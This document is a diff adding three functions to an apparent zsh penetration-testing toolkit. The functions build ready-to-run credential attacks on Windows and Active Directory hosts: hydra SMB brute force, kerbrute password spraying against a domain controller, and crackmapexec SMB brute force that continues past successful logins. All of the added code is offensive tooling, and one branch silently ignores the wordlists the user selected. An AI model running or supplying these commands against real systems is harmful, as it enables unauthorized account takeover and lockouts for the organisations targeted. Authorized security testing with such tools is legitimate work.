@@ -230,3 +230,161 @@ nb-ad-rce-cme-winrm() {
       __err "Invalid option. Please choose 'p' for password or 'h' for hash."
   fi
 }
+
+nb-ad-rce-brute-hydra() {
+    __check-project
+    nb-vars-set-rhost
+
+    __ask "You wanna brute force login/password/both? (l/p/b)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    __ask "Is the service running on default port? (y/n)"
+    local df && __askvar df "DEFAULT_PORT"
+
+    if [[ $df == "n" ]]; then
+      __ask "Enter port number"
+      local pn && __askvar pn "PORT_NUMBER"
+    fi
+
+    if [[ $login == "p" ]]; then
+      nb-vars-set-user
+      if [[ $df == "n" ]]; then
+        print -z "hydra -l ${__USER} -P ${__PASSLIST} -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
+      else
+        print -z "hydra -l ${__USER} -P ${__PASSLIST} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
+      fi
+    elif [[ $login == "l" ]]; then
+      nb-vars-set-wordlist
+      nb-vars-set-pass
+      if [[ $df == "n" ]]; then
+        print -z "hydra -L ${__WORDLIST} -p ${__PASS} -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
+      else
+        print -z "hydra -L ${__WORDLIST} -p ${__PASS} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
+      fi
+    elif [[ $login == "b" ]]; then
+      __ask "Do you wanna manually specify wordlists? (y/n)"
+      local sw && __askvar sw "SPECIFY_WORDLIST"
+      if [[ $sw == "y" ]]; then
+        __ask "Select a user list"
+        __askpath ul FILE $HOME/desktop/projects/
+        __ask "Select a password list"
+        __askpath pl FILE $HOME/desktop/projects/
+
+        if [[ $df == "n" ]]; then
+          print -z "hydra -L $ul -P $pl -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
+        else
+          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
+        fi
+      else
+        nb-vars-set-wordlist
+        if [[ $df == "n" ]]; then
+          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
+        else
+          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
+        fi
+      fi
+    else
+      echo
+      __err "Invalid option. Please choose 'p' for password or 'l' for login or 'b' for both."
+    fi
+}
+
+nb-ad-rce-pass-spray() {
+    __check-project
+    nb-vars-set-domain
+
+	  __ask "Enter the IP address of the target DC controller"
+    nb-vars-set-dchost
+
+    __ask "Select a user list"
+    __askpath ul FILE $HOME/desktop/projects/
+
+	  __ask "Enter the password for spraying"
+    local pw && __askvar pw PASSWORD
+
+    print -z "kerbrute passwordspray -d ${__DOMAIN} --dc ${__DCHOST} $ul '$pw' -o $(__dcpath)/kerbrute-password-spray.txt"
+}
+
+nb-ad-rce-brute-cme() {
+    __check-project
+    nb-vars-set-rhost
+
+    __ask "You wanna brute force login/password/both? (l/p/b)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    __ask "Do you want to add a domain? (y/n)"
+    local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"
+
+    __ask "Do you wanna manually specify wordlists? (y/n)"
+    local sw && __askvar sw "SPECIFY_WORDLIST"
+
+    if [[ $login == "p" ]]; then
+      if [[ $sw == "y" ]]; then
+        __ask "Select a password list"
+        __askpath pl FILE $HOME/desktop/projects/
+        nb-vars-set-user
+
+        if [[ $add_domain == "y" ]]; then
+          nb-vars-set-domain
+          print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '$pl' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
+        else
+          print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '$pl' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
+        fi
+      else
+        nb-vars-set-passlist
+        if [[ $add_domain == "y" ]]; then
+          nb-vars-set-domain
+          print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '${__PASSLIST}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
+        else
+          print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '${__PASSLIST}' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
+        fi
+      fi
+    elif [[ $login == "l" ]]; then
+      if [[ $sw == "y" ]]; then
+        __ask "Select a user list"
+        __askpath ul FILE $HOME/desktop/projects/
+        nb-vars-set-pass
+
+        if [[ $add_domain == "y" ]]; then
+          nb-vars-set-domain
+          print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '${__PASS}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
+        else
+          print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '${__PASS}' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
+        fi
+      else
+        nb-vars-set-wordlist
+        if [[ $add_domain == "y" ]]; then
+          nb-vars-set-domain
+          print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASS}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
+        else
+          print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASS}' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
+        fi
+      fi
+    elif [[ $login == "b" ]]; then
+      if [[ $sw == "y" ]]; then
+        __ask "Select a password list"
+        __askpath pl FILE $HOME/desktop/projects/
+        __ask "Select a user list"
+        __askpath ul FILE $HOME/desktop/projects/
+
+        if [[ $add_domain == "y" ]]; then
+          nb-vars-set-domain
+          print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '$pl' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
+        else
+          print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '$pl' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
+        fi
+      else
+        nb-vars-set-wordlist
+        nb-vars-set-passlist
+        if [[ $add_domain == "y" ]]; then
+          nb-vars-set-domain
+          print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASSLIST}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
+        else
+          print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASSLIST}' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
+        fi
+      fi
+    else
+      echo
+      __err "Invalid option. Please choose 'p' for password or 'l' for login or 'b' for both."
+    fi
+}
